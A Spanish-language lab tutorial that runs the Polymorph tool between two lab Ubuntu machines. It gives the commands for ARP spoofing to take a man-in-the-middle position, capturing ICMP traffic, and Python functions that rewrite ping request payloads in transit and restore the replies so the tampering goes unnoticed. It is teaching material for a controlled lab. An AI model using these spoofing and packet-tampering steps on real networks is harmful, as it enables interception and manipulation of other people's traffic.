# Polymorph (Manipulación de trafico ICMP)

Vamos hacer un caso de uso sencillito para comprender bien toda esta herramienta y como funciona por debajo.

Tendremos que tener 2 maquinas levantadas `Ubuntu-Mutillidae` y la de `Ubutnu-Metasploitable`.

Tendremos que instalar unos paquetes en la de `Ubuntu-Mutillidae` por lo que nos vamos a una terminal y ponemos lo siguiente:

```shell
sudo apt-get install wireshark
sudo apt-get install traceroute
```

Si nosotros abrimos `wireshark` y ponemos a capturar en la interfaz `eth0`, y hacemos un `ping` a nuestra maquina `Ubuntu-Metasploitable` veremos en `wireshark` que hay trafico `ICMP`.

Lo que vamos hacer es que en el campo `Data` de `wireshark` cuando se hace un `ping` llegan unos paquetes `ICMP` con una serie de `bytes`, pues nosotros como atacantes lo que vamos hacer es cambiar esos `bytes` a nuestro gusto, de manera que cuando lo veamos con `wireshark` se vea lo que hemos puesto en ese campo `Data`.

Por lo que primero tendremos que estar en mitad de la comunicacion, pero a nivel de red va a ser un poco distinto que como hicimos anteriores veces, en este caso tambien tendremos que hacer un `ARP Spoofing` pero en vez de contactar con el `Router` la maquina para comunicarse con la otra, lo hacer de forma directa, esto lo podremos ver de la siguiente forma:

> traceroute desde la maquina `Ubuntu-Mutillidae` a la maquina `Ubuntu-Metasploitable`

```shell
traceroute 192.168.5.183
```

Info:

<figure><img src="../../../../.gitbook/assets/image (130) (1).png" alt=""><figcaption></figcaption></figure>

Por lo que vemos no pasa por ningun `Router` su conexion es directa, por lo que vamos a envenenar la red con un `ARP Spoofing` que la propia herramienta de `Polymiorph` ya nos trae.

Haremos un `ARP Spoofing` de la siguiente forma:

```shell
polymorph
```

```shell
spoof -t 192.168.5.177 -g 192.168.5.183
```

De la maquina `Ubuntu-Mutillidae` a la maquina `Ubuntu-Metasploitable`.

Con el `-t` especificamos el `target` Con el `-g` especificamos el `gateway`, pero en este caso como no pasa por un `Router` ponemos la IP de la maquina a la cual se comunica directamente.

Info:

```
[+] ARP spoofing started between 192.168.5.183 and 192.168.5.177
```

Y tan sencillo como esto ya estariamos haciendo un `ARP Spoofing`.

Si ahora nos vamos a la maquina `Ubuntu-Mutillidae` y ponemos el siguiente comando:

```shell
traceroute 192.168.5.183
```

Info:

<figure><img src="../../../../.gitbook/assets/image (131) (1).png" alt=""><figcaption></figcaption></figure>

Ahora pega un salto mas pasando por nuestra IP de la maquina atacante.

Ahora le decimos a `Polymorph` que se ponga a capturar en concreto paquetes de `ICMP`:

```shell
capture -f icmp
```

Info:

```
[+] Waiting for packets...

(Press Ctr-C to exit)
```

Ahora estara a la escucha de cualquier paquete `ICMP` que pase, por lo que nosotros en la maquina `Ubuntu-Mutillidae` haremos lo siguiente:

```shell
ping 192.168.5.183
```

Veremos que se hace un `ping` normal, pero si volvemos a nuestro `kali` y le damos a `Ctrl+C` veremos que nos dice lo siguiente:

```
[+] Parsing packet: 24
[+] Parsing complete!
```

Y en el prompt de terminal, veremos lo siguiente:

```
PH:cap > 
```

Si ejecutamos el comando `show` podremos ver los paquetes que se han intercambiado.

Y si nosotros ponemos el comando `wireshark` lo que hace es mover todos esos paquetes a `wireshark`, abriendose el mismo para verlo todo de forma mas visual.

Todos los numeros que veamos en `wireshark` para la herramienta `polymorph` se clasificaran como plantillas, por lo que si nos interesa el pquete de red del numero `3`, podremos decirle a la herramienta en la terminal, que se quede con el numero `3`.

```shell
template 3
```

Y ahora veremos el siguiente `prompt`:

```
PH:cap/t3 > 
```

Indicando que estamos en la plantilla `3`.

Y si ejecutamos `show` podremos ver ese paquete de forma mas detallada.

Ahora si queremos modificar el paquete, lo podremos hacer con el siguiente comando:

```shell
functions -a icmp_func -e nano
```

En el campo de `-a` especificamos el nombre que queramos. En el campo de `-e` especificamos con el editor con el que lo queremos abrir.

Nuestro paquete con esta funcion por dentro se vera algo asi:

```python
def icmp_func(packet)

	# your code here

	# If the condition is meet
	return packet
```

Podremos acceder a los diferentes valores del paquete con los nombres que vienen asociados a cada seccion cuando hacemos un `show` del paquete.

Y podremos programar algo tal que lo siguiente para hacer como un filtro:

```python
def icmp_func(packet)
	if packet['IP']['proto'] == 1:
		print("He recibido un paquete ICMP")
	else:
		print("He recibido otro paquete de red")
	return packet
```

Con esto lo que estamos haciendo es que cuando vemos las opciones del paquete sabemos que siempre suele estar en valor `1` de la seccion de `IP` la funcion de `Proto` que se identifica como `FT_INT_BE`, por lo que estamos haciendo un filtro con este codigo.

Y cuando lo guardemos esta funcion quedara añadida a `polymorph`:

```
[+] Function icmp_func added
```

Y con el comando `functions -s` podremos ver las funciones que estan añadidas y el orden de las funciones, ya que se ejecuta de manera secuencial sobre los paquetes.

Si ponemos el comando:

```
intercept
```

Info:

```
[+] Waiting for packets...

(Press Ctr-C to exit)
```

Ahora ya si que todos los paquetes que pasen por nosotros que estamos en medio de la comunicacion entre las 2 maquinas `Ubuntu` van a pasar por `polymorph` y la funcion que hemos creado se va a ejecutar sobre cada uno de los paquetes de red que interceptemos.

Si nosotros en la maquina `Ubutnu` hacemos un `ping`:

```shell
ping 192.168.5.183
```

Y nos volvemos al `kali`, podremos ver lo siguiente por terminal:

```
He recibido un paquete ICMP
He recibido un paquete ICMP
He recibido un paquete ICMP
He recibido un paquete ICMP
He recibido un paquete ICMP
He recibido un paquete ICMP
```

Por lo que vemos se esta ejecutando correctamente y se esta modificando a tiempo real.

Ahora en vez de sacar estos campos por pantalla, podremos modificarlos de la siguiente forma:

Vamos a ejecutar el mismo comando de antes, donde tenemos el codigo, pero haremos los siguientes cambios:

```shell
functions -a icmp_func -e nano
```

Info:

```python
def icmp_func(packet)
	if packet['IP']['proto'] == 1:
		print("He recibido un paquete ICMP")
		if packet['ICMP']['type'] == 8:
			print("El paquete de red es ICMP Request")
			packet['ICMP']['data'] = packet['ICMP']['data'][:-8] + b'attacker'
	else:
		print("He recibido otro paquete de red")
	return packet
```

Con esto lo que estamos haciendo es modificar le paquete `request ICMP`, para que en el contenido del apartado `Data` tenga otro contenido diferente, en concreto modificamos los ultimos valores que serina `01234567` poniendo que todo lo demas este igual menos los ultimos `8` digitos que los eliminaria, para añadir otro `8` valores que serian `attacker`.

Ahora nos volvemos a poner a interceptar:

```
intercept
```

Info:

```
[+] Waiting for packets...

(Press Ctr-C to exit)
```

Nos vamos a la maquina `Ubuntu` hacuendo un `ping`:

```shell
ping 192.168.5.183
```

Y si nos vamos al `kali` veremos lo siguiente:

```
He recibido un paquete ICMP
El paquete de red es ICMP Request
He recibido un paquete ICMP
He recibido un paquete ICMP
El paquete de red es ICMP Request
He recibido un paquete ICMP
He recibido un paquete ICMP
El paquete de red es ICMP Request
He recibido un paquete ICMP
He recibido un paquete ICMP
El paquete de red es ICMP Request
He recibido un paquete ICMP
He recibido un paquete ICMP
El paquete de red es ICMP Request
```

Ha parte de estar mostrandonos esto por pantalla, nos los ha modificado los paquetes con la cadena que le pedimos, podremos comprobarlo en `wireshark` si hemos estado capturando el trafico de red, si nos vamos al campo `data` podremos ver que tiene la palabra `attacker`.

Lo que tambien se puede hacer es que en vez de que se quede modificado el paquete `ICMP` ala que se lo devuelva la otra maquina si esta modificado va a saber que lo esta por lo que no va a responder de la misma forma que en un `ping` normal, por lo que podemos programar esto paar que envie el paquete modificado pero cuando le responda, le responda con el paquete original por que se lo volveremos a modificar a tiempo real con los valores que tenia para que establezcan una comunicacion "legitima".

Volveremos al codigo de antes:

```shell
functions -a icmp_func -e nano
```

Info:

```python
def icmp_func(packet)
	if packet['IP']['proto'] == 1:
		print("He recibido un paquete ICMP")
		if packet['ICMP']['type'] == 8:
			print("El paquete de red es ICMP Request")
			packet['ICMP']['data'] = packet['ICMP']['data'][:-8] + b'attacker'
		else:
			print("El paquete de red es ICMP Replay")
			packet['ICMP']['data'] = packet['ICMP']['data'][:-8] + b'01234567'
	else:
		print("He recibido otro paquete de red")
	return packet
```

Lo que estamos haciendo aqui es que si detectamos que es un `paquete Replay` que ese el que responde, lo modificaremos con los valores reales del paquete.

Guardamos esto y volveriamos a interceptar otra vez con la herramienta `polymorph`:

```
intercept
```

Info:

```
[+] Waiting for packets...

(Press Ctr-C to exit)
```

Y si hacemos un `ping` en la maquina `Ubuntu` mientras estamos con el `wireshark` capturando el trafico de red:

```shell
ping 192.168.5.183
```

Podremos ver en `wireshark` que el paquete que envia es con el contenido `data` de la cadena `attacker` y cuando le responde, le responde con el paquete modificado original de la cadena `01234567`, por lo que mantienen una comunicacion "legitima".
